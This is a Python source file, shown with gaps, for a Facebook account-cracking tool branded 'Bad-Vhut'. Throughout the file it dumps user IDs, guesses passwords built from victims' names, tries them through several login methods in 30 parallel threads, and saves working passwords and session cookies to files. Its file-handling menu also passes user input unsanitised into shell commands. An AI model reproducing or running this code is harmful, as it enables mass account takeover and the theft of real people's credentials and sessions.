...
from concurrent.futures import ThreadPoolExecutor as sarfrazvhut
from string import * 
...
sys.stdout.write('\x1b]2; Bad-Vhut\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
                                                 ...
                                                 dddddddd                                                                                                       
BBBBBBBBBBBBBBBBB                                d::::::d                 VVVVVVVV           VVVVVVVVhhhhhhh                                      tttt          
B::::::::::::::::B                               d::::::d                 V::::::V           V::::::Vh:::::h                                   ttt:::t          
B::::::BBBBBB:::::B                              d::::::d                 V::::::V           V::::::Vh:::::h                                   t:::::t          
BB:::::B     B:::::B                             d:::::d                  V::::::V           V::::::Vh:::::h                                   t:::::t          
  B::::B     B:::::B  aaaaaaaaaaaaa      ddddddddd:::::d                   V:::::V           V:::::V  h::::h hhhhh       uuuuuu    uuuuuuttttttt:::::ttttttt    
  B::::B     B:::::B  a::::::::::::a   dd::::::::::::::d                    V:::::V         V:::::V   h::::hh:::::hhh    u::::u    u::::ut:::::::::::::::::t    
  B::::BBBBBB:::::B   aaaaaaaaa:::::a d::::::::::::::::d                     V:::::V       V:::::V    h::::::::::::::hh  u::::u    u::::ut:::::::::::::::::t    
  B:::::::::::::BB             a::::ad:::::::ddddd:::::d  ---------------     V:::::V     V:::::V     h:::::::hhh::::::h u::::u    u::::utttttt:::::::tttttt    
  B::::BBBBBB:::::B     aaaaaaa:::::ad::::::d    d:::::d  -:::::::::::::-      V:::::V   V:::::V      h::::::h   h::::::hu::::u    u::::u      t:::::t          
  B::::B     B:::::B  aa::::::::::::ad:::::d     d:::::d  ---------------       V:::::V V:::::V       h:::::h     h:::::hu::::u    u::::u      t:::::t          
  B::::B     B:::::B a::::aaaa::::::ad:::::d     d:::::d                         V:::::V:::::V        h:::::h     h:::::hu::::u    u::::u      t:::::t          
  B::::B     B:::::Ba::::a    a:::::ad:::::d     d:::::d                          V:::::::::V         h:::::h     h:::::hu:::::uuuu:::::u      t:::::t    tttttt
BB:::::BBBBBB::::::Ba::::a    a:::::ad::::::ddddd::::::dd                          V:::::::V          h:::::h     h:::::hu:::::::::::::::uu    t::::::tttt:::::t
B:::::::::::::::::B a:::::aaaa::::::a d:::::::::::::::::d                           V:::::V           h:::::h     h:::::h u:::::::::::::::u    tt::::::::::::::t
B::::::::::::::::B   a::::::::::aa:::a d:::::::::ddd::::d                            V:::V            h:::::h     h:::::h  uu::::::::uu:::u      tt:::::::::::tt
BBBBBBBBBBBBBBBBB     aaaaaaaaaa  aaaa  ddddddddd   ddddd                             VVV             hhhhhhh     hhhhhhh    uuuuuuuu  uuuu        ttttttttttt  
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Bad-Vhut 
\033[1;37m Facebook:            Bad-Vhut 
\033[1;37m Github  :            Bad-Vhut
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back vhut Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Bad-Vhut] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);vhutb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={vhutb};{ckkk}"
                    print(f"\r{R} [Bad-Vhut-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Bad-Vhut_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/vhut_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [Bad-Vhut-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/vhut_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Bad-Vhut] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Bad-Vhut-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/vhut_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/vhut_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [Bad-Vhut-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/Bad-Vhut_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[Bad-Vhut] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [Bad-Vhut-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/Bad-Vhut_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/vhut_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [vhut-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/vhut_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[Bad-Vhut] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [Bad-Vhut-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/vhut_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sarfrazvhut(max_workers=30) as vhutworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                vhutworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                vhutworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                vhutworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                vhutworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/vhut.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/vhut.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    vhut = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+vhut+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + vhut )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back vhut Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/vhut.txt\n') 
        filepath = input("Put File Name: ")
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back Bad-Vhut Menu ")
        vhut(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    ...
    print(47*'-')
    input(f"{S} Press Enter To Back Bad-Vhut Menu ")
    vhut(allkey)       
